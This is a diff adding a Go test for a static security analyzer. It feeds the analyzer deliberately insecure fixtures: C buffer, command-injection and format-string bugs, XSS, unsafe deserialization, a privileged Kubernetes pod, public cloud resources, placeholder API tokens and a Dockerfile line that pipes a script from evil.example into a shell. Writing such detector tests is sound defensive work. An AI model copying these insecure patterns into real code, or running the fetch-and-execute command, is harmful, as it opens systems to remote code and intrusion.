@@ -151,6 +151,71 @@ include($_POST['page']);
 	}
 }
 
+// TestBuiltinCoversMoreFileTypes proves the zero-dependency analyzer now
+// catches issues in C/C++, C#, Swift, HTML, Dockerfile, Terraform and
+// Kubernetes manifests — the "all file types" promise.
+func TestBuiltinCoversMoreFileTypes(t *testing.T) {
+	res := runBuiltin(t, map[string]string{
+		"main.c": `#include <string.h>
+#include <stdlib.h>
+void copy(char *buf, const char *src) {
+    strcpy(buf, src);
+    system("cat " + src);
+    printf(src);
+}
+`,
+		"app.cs": `Response.Write(Request.QueryString["q"]);`,
+		"App.swift": `let data = try NSKeyedUnarchiver.unarchiveTopLevelObjectWithData(blob)
+let h = Insecure.MD5.hash(data: payload)`,
+		"index.html": `<a href="javascript:alert(1)">x</a> <button onclick="run()">go</button>`,
+		"Dockerfile": `FROM debian
+RUN curl -fsSL https://evil.example/x.sh | sh
+CMD ["/bin/bash"]`,
+		"main.tf": `resource "aws_security_group" "web" {
+  ingress {
+    cidr_blocks = ["0.0.0.0/0"]
+  }
+}
+resource "aws_s3_bucket" "b" {
+  acl = "public-read"
+}`,
+		"pod.yaml": `apiVersion: v1
+kind: Pod
+spec:
+  hostNetwork: true
+  containers:
+  - name: c
+    securityContext:
+      privileged: true
+`,
+		"keys.env": `OPENAI_API_KEY=sk-proj-abcdefghijklmnopqrstuvwxyz1234567890
+HF_TOKEN=hf_abcdefghijklmnopqrstuvwxyz123456
+NPM_AUTHTOKEN=//registry.npmjs.org/:_authToken=abcdefghijklmnopqrstuvwxyz123456
+`,
+	})
+
+	for _, rule := range []string{
+		"builtin.unsafe-string.c",
+		"builtin.command-injection.c",
+		"builtin.format-string.c",
+		"builtin.xss.csharp",
+		"builtin.unsafe-deserialization.swift",
+		"builtin.weak-crypto.swift",
+		"builtin.xss.html-inline",
+		"builtin.docker-remote-script",
+		"builtin.terraform-open-ingress",
+		"builtin.terraform-s3-public",
+		"builtin.k8s-privileged",
+		"builtin.secret.OpenAI/Anthropic API key hardcoded in source",
+		"builtin.secret.Hugging Face access token hardcoded in source",
+		"builtin.secret.npm registry auth token hardcoded in source",
+	} {
+		if !hasRule(res.SecurityFindings, rule) {
+			t.Errorf("expected rule %q to be reported; got %v", rule, rulesOf(res.SecurityFindings))
+		}
+	}
+}
+
 // TestBuiltinCleanCodeProducesNoFindings guards against false positives: a
 // parameterized, safe codebase must not be flagged by the pattern rules.
 func TestBuiltinCleanCodeProducesNoFindings(t *testing.T) {
